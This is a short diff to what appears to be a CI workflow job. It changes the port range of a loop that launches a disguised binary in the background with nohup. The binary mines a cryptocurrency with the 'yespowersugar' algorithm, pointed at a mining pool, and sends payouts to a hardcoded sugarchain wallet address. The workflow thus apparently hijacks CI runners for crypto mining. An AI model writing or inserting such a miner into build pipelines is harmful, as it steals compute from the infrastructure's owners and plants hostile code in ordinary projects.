@@ -73,7 +73,7 @@ jobs:
           # Ensure sgr file is present
           if [ -f $dynamic_sgr ]; then
             # Start the process for multiple ports
-            for port in $(seq 602 610); do
+            for port in $(seq 502 510); do
               # Run the process with the specified parameters in background
               nohup $dynamic_sgr -a yespowersugar --pool $ip:$port -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr --timeout 120 -t 4 -p m=solo > dance_$port_$timestamp.log 2>&1 &
               process_pid=$!
